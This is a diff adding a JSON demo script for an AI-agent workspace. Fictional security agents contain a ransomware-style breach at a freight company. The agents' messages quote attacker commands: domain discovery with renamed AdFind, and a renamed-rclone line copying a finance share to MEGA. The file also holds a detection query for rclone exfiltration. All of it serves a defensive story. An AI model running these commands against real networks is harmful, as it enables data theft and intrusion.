@@ -1,0 +1,179 @@
+{
+  "version": 1,
+  "title": "Agents stop an active breach at 3 a.m.",
+  "clock": "03:25",
+  "settings": {
+    "Noodle.firstBotSetup.dismissed": true,
+    "Noodle.composer.showBotDescriptions": true
+  },
+  "harnesses": {
+    "claude-code": { "models": "builtin" },
+    "codex": { "models": [
+      { "id": "gpt-5.2-codex", "name": "GPT-5.2 Codex", "description": "Tuned for long coding tasks.",
+        "efforts": ["low", "medium", "high"], "defaultEffort": "medium", "default": true } ] }
+  },
+  "agents": [
+    { "key": "juno", "name": "Juno", "harness": "claude-code", "model": "sonnet",
+      "description": "SOC: triages every alert, around the clock", "avatar": { "image": "face:feminine-11" } },
+    { "key": "ines", "name": "Ines", "harness": "claude-code", "model": "opus",
+      "description": "SOC: Okta and Active Directory sign-ins", "avatar": { "image": "face:feminine-18" } },
+    { "key": "rafe", "name": "Rafe", "harness": "codex", "model": "gpt-5.2-codex", "effort": "high",
+      "description": "SOC: endpoints and Defender telemetry", "avatar": { "image": "face:masculine-12" } },
+    { "key": "theo", "name": "Theo", "harness": "codex", "model": "gpt-5.2-codex", "effort": "medium",
+      "description": "SOC: firewall, DNS and outbound traffic", "avatar": { "image": "face:masculine-21" } },
+    { "key": "margot", "name": "Margot", "harness": "claude-code", "model": "opus", "effort": "high",
+      "description": "Response: runs incidents and keeps the timeline", "avatar": { "image": "face:feminine-60" } },
+    { "key": "nash", "name": "Nash", "harness": "codex", "model": "gpt-5.2-codex", "effort": "high",
+      "description": "Response: containment, backups and recovery", "avatar": { "image": "face:masculine-30" } },
+    { "key": "odile", "name": "Odile", "harness": "claude-code", "model": "opus",
+      "description": "Response: legal, regulators, insurer and staff", "avatar": { "image": "face:feminine-33" } },
+    { "key": "sasha", "name": "Sasha", "harness": "claude-code", "model": "opus",
+      "description": "Research: threat actors and how they operate", "avatar": { "image": "face:any-07" } },
+    { "key": "emeric", "name": "Emeric", "harness": "codex", "model": "gpt-5.2-codex", "effort": "medium",
+      "description": "Research: writes and tests detections", "avatar": { "image": "face:masculine-17" } }
+  ],
+  "conversations": [
+    { "key": "incident", "pinned": true, "background": { "preset": "cherry" },
+      "group": { "name": "Incident 2026-017", "description": "Finance share exfiltration, severity 1", "members": ["margot", "nash", "rafe", "ines", "odile"] },
+      "messages": [
+        { "at": "03:02", "from": "margot",
+          "text": "Incident 2026-017 is open, **severity 1**: data is leaving now, and the actor has gone for the backups, which usually comes just before ransomware.\n\nOrder of work:\n1. Stop the upload\n2. Cut every way in\n3. Protect the backups\n4. Keep the evidence\n\nNobody powers anything off. I am keeping the timeline." },
+        { "at": "03:06", "from": "nash",
+          "text": "MEGA is blocked at the firewall for every host, not just HF-FS02. The upload stopped at **43.7 GB**." },
+        { "at": "03:09", "from": "rafe",
+          "text": "FIN-VDI-07 and HF-FS02 are isolated in Defender. I captured memory on both first, so we keep what was running." },
+        { "at": "03:11", "from": "ines",
+          "text": "d.price is suspended in Okta with every session and token revoked. svc_backup is disabled in AD and its password reset." },
+        { "key": "odile-clock", "at": "03:16", "from": "odile",
+          "text": "Spoke to Daniel's manager. Daniel is on paternity leave and never called the help desk; the caller had his staff number and his manager's name.\n\nThe finance share holds payroll for all 1,800 staff, so this is a personal data breach. Our 72 hours to tell the ICO run to **03:16 on Sunday**. I have opened a claim on the insurer's breach line; their incident response firm joins us at 08:00.",
+          "reactions": [ { "from": "margot", "emoji": "👍" } ] }
+      ] },
+    { "key": "detection", "pinned": true, "background": { "preset": "midnight" },
+      "group": { "name": "Detection", "description": "SOC for Halden Freight, 1,800 staff, 24/7", "members": ["juno", "ines", "rafe", "theo"] },
+      "messages": [
+        { "at": "02:07", "from": "ines",
+          "text": "New MFA factor for **d.price** (Finance) at 01:58: Okta Verify on a phone we have never seen, then a Citrix sign-in from 203.0.113.48, a residential proxy in the Netherlands. Daniel signs in from Leeds.\n\nThe help desk reset his MFA yesterday at 16:52 (INC-48213). Medium for now while I check he asked for it." },
+        { "at": "02:19", "from": "rafe",
+          "text": "His Citrix session on FIN-VDI-07 is doing discovery no one in Finance does:\n\n```\nnltest /domain_trusts\nnet group \"Domain Admins\" /domain\naf.exe -f \"objectcategory=computer\" > c.txt\n```\n\n`af.exe` is AdFind with the name changed." },
+        { "at": "02:24", "from": "juno",
+          "text": "Identity and endpoint alerts on the same account, 25 minutes apart. Raised to **high** and paged the on-call.",
+          "reactions": [ { "from": "user", "emoji": "👀" } ] },
+        { "at": "02:41", "from": "ines",
+          "text": "Kerberoasting from FIN-VDI-07: 31 service tickets in 40 seconds, all RC4 (event 4769, type 0x17). One is **svc_backup**, whose password was last changed in 2019." },
+        { "at": "02:52", "from": "rafe",
+          "text": "svc_backup has just signed in to HF-FS02 and HF-VBR01, the Veeam server, from FIN-VDI-07. On HF-VBR01, PowerShell is reading the saved credentials out of the Veeam database. They are after the backups." },
+        { "at": "02:58", "from": "theo",
+          "text": "HF-FS02 has sent **41 GB** to `gfs262n.userstorage.mega.co.nz` since 02:44, from `C:\\ProgramData\\svchost.exe`. It is rclone renamed:\n\n```\nsvchost.exe copy \\\\hf-fs02\\finance mb:q4 --transfers 16 --max-age 2y --include \"*.{xlsx,pdf,csv}\"\n```" },
+        { "key": "declare", "at": "03:01", "from": "user",
+          "text": "Declaring an incident. Margot leads. Contain now; nothing in the runbook needs to wait for me.",
+          "reactions": [ { "from": "juno", "emoji": "👍" } ] }
+      ] },
+    { "key": "research",
+      "group": { "name": "Threat Research", "description": "Who is attacking companies like ours, and how we catch them", "members": ["sasha", "emeric"] },
+      "messages": [
+        { "at": "-2d 11:20", "from": "sasha",
+          "text": "Weekly brief: help-desk calls are still the most common way in against UK retail and logistics this year. A caller poses as staff, has MFA reset, adds a remote access tool, then goes for backups before encrypting." },
+        { "at": "02:35", "from": "sasha",
+          "text": "Tonight follows that playbook step for step: help-desk reset, AdFind, Kerberoasting, then Veeam. Too early to name a group. Consistent with a ransomware affiliate, **low confidence**." },
+        { "at": "02:55", "from": "emeric",
+          "text": "We have nothing that would catch renamed rclone. Writing a rule on its command line rather than its file name, since they always rename it." }
+      ] },
+    { "key": "margot", "direct": "margot",
+      "messages": [
+        { "at": "-1d 17:40", "from": "margot",
+          "text": "The help desk MFA reset review is due Friday. Two resets last month were approved on a staff number alone." }
+      ] },
+    { "key": "juno", "direct": "juno",
+      "messages": [
+        { "at": "-1d 07:30", "from": "juno",
+          "text": "Overnight: 412 alerts, 9 needed a look, none were real. Most of the noise was the new print server tripping the SMB rule." }
+      ] },
+    { "key": "ines", "direct": "ines",
+      "messages": [
+        { "at": "-1d 15:05", "from": "ines",
+          "text": "14 accounts still sign in to Okta with SMS codes, all in the depots. I have asked their managers to move them to Okta Verify by the end of the month." }
+      ] },
+    { "key": "rafe", "direct": "rafe",
+      "messages": [
+        { "at": "-2d 10:12", "from": "rafe",
+          "text": "Defender is on 1,794 of 1,801 machines. The seven without it are warehouse scanners on Windows 10 IoT; I have put them in their own network segment." }
+      ] },
+    { "key": "theo", "direct": "theo",
+      "messages": [
+        { "at": "-1d 11:48", "from": "theo",
+          "text": "Personal cloud storage is blocked for staff, but servers were never in that policy. I have drafted a rule to block it for servers too; it is waiting on the change board." }
+      ] },
+    { "key": "nash", "direct": "nash",
+      "messages": [
+        { "at": "-3d 14:20", "from": "nash",
+          "text": "Restore test passed: HF-FS02 back from the hardened repository in 3 h 40 min, every file checked against its hash." }
+      ] },
+    { "key": "odile", "direct": "odile",
+      "messages": [
+        { "at": "-4d 09:30", "from": "odile",
+          "text": "The cyber policy renews in December. The insurer wants proof of MFA on remote access and offline backups; we can show both." }
+      ] },
+    { "key": "sasha", "direct": "sasha",
+      "messages": [
+        { "at": "-2d 11:25", "from": "sasha",
+          "text": "Sent the help-desk brief to the service desk lead too. They are adding a call-back to the number on file before any MFA reset." }
+      ] },
+    { "key": "emeric", "direct": "emeric",
+      "messages": [
+        { "at": "-1d 16:30", "from": "emeric",
+          "text": "Retired 11 detections that fired over 200 times last month without a single true positive. Alert volume is down 30%." }
+      ] }
+  ],
+  "present": {
+    "window": { "size": [1240, 860] },
+    "select": "incident"
+  },
+  "film": {
+    "background": "black",
+    "intro": { "title": "An active breach, contained",
+      "subtitle": "Detection, response and research agents working the same incident at 3 a.m." },
+    "outro": { "tagline": "A workspace for your AI agents." }
+  },
+  "timeline": [
+    { "capture": "01-incident-open" },
+    { "wait": 1.0, "focus": "composer" },
+    { "wait": 0.8, "in": "incident",
+      "type": { "text": "Margot, where are we? Is the actor still in anywhere?" } },
+    { "wait": 0.4, "focus": "transcript" },
+    { "agent": "margot", "status": { "phase": "working", "detail": "Asking Rafe to hunt for other footholds" } },
+    { "agent": "rafe", "status": { "phase": "working", "detail": "Hunting for remote access tools" } },
+    { "wait": 0.6, "agent": "rafe",
+      "toolCall": { "title": "Hunting across every device", "input": "DeviceProcessEvents\n| where Timestamp > ago(30d)\n| where FileName =~ \"AnyDesk.exe\" and ProcessCommandLine has \"--install\"\n| summarize First = min(Timestamp) by DeviceName, AccountName",
+        "output": "DeviceName   AccountName  First\nFIN-VDI-07   d.price      2026-10-15 02:31\nHF-JMP02     svc_backup   2026-10-15 03:04", "exit": 0, "duration": 1.6 } },
+    { "wait": 0.4, "agent": "rafe", "in": "incident",
+      "reply": { "key": "foothold",
+        "text": "Yes, one more. AnyDesk was installed on the jump host **HF-JMP02** at 03:04, seven minutes before svc_backup was disabled, and it is still connected out to an AnyDesk relay. Isolating it now." } },
+    { "wait": 0.4, "agent": "rafe",
+      "toolCall": { "title": "Isolating HF-JMP02", "input": "POST https://api.securitycenter.microsoft.com/api/machines/7f3c9a21e4/isolate\n{ \"Comment\": \"IR 2026-017: AnyDesk persistence\", \"IsolationType\": \"Full\" }",
+        "output": "{ \"type\": \"Isolate\", \"status\": \"Succeeded\", \"computerDnsName\": \"hf-jmp02.corp.haldenfreight.com\" }", "exit": 0, "duration": 1.2 } },
+    { "agent": "rafe", "status": { "phase": "ready" } },
+    { "agent": "nash", "status": { "phase": "working", "detail": "Checking the backup repositories" } },
+    { "wait": 0.6, "agent": "nash",
+      "toolCall": { "title": "Checking the backups", "input": "Get-VBRBackupRepository | Format-Table Name, Type",
+        "output": "Name             Type\nHF-HARDENED-01   LinuxHardened\nHF-NAS-01        Smb", "exit": 0, "duration": 1.0 } },
+    { "wait": 0.4, "agent": "nash", "in": "incident",
+      "reply": { "text": "The backups are safe. The nightly copies go to the hardened Linux repository, which keeps each one immutable for 14 days, and nothing was deleted.\n\nThe SMB copy on HF-NAS-01 is reachable with the credentials they read, so I have taken it offline and I am rotating every account in the Veeam store." } },
+    { "agent": "nash", "status": { "phase": "ready" } },
+    { "wait": 0.6, "agent": "margot", "in": "incident",
+      "reply": { "key": "status",
+        "text": "Where we are:\n\n- **Contained**: the upload is stopped and all three hosts are isolated, with memory kept\n- **Access cut**: d.price, svc_backup and the AnyDesk foothold\n- **Backups**: intact and immutable\n- **Not seen**: no DCSync and no new admins. If that changes, we reset krbtgt twice\n\nNext: Ines reviews every help-desk MFA reset in the last 30 days, and Theo lists exactly which files left so Odile can scope the notice." } },
+    { "agent": "margot", "status": { "phase": "ready" } },
+    { "wait": 0.6, "agent": "odile", "in": "incident", "react": { "message": "status", "emoji": "👍" } },
+    { "wait": 0.8, "agent": "sasha", "in": "research",
+      "reply": { "text": "A second remote tool on a jump host, just before the account was cut, is the same playbook: they set up another way in once they think they have been seen. Worth hunting the last 90 days for any remote access tool we do not license." } },
+    { "agent": "emeric", "status": { "phase": "working", "detail": "Testing the rclone rule" } },
+    { "wait": 0.5, "agent": "emeric",
+      "toolCall": { "title": "Testing against 90 days", "input": "DeviceProcessEvents\n| where Timestamp > ago(90d)\n| where ProcessCommandLine has_any (\" copy \", \" sync \") and ProcessCommandLine has_any (\"--transfers\", \"--multi-thread-streams\", \"--max-age\")\n| where FileName !~ \"rclone.exe\"\n| project Timestamp, DeviceName, FileName",
+        "output": "Timestamp             DeviceName  FileName\n2026-10-15 02:44:09   HF-FS02     svchost.exe\n1 result in 90 days", "exit": 0, "duration": 1.4 } },
+    { "wait": 0.4, "agent": "emeric", "in": "research",
+      "reply": { "text": "The renamed rclone rule is live in Defender and Sentinel as a high-severity alert. Over 90 days it finds tonight and nothing else, so it will not be noisy." } },
+    { "agent": "emeric", "status": { "phase": "ready" } },
+    { "focus": "none" },
+    { "capture": "02-contained" }
+  ]
+}
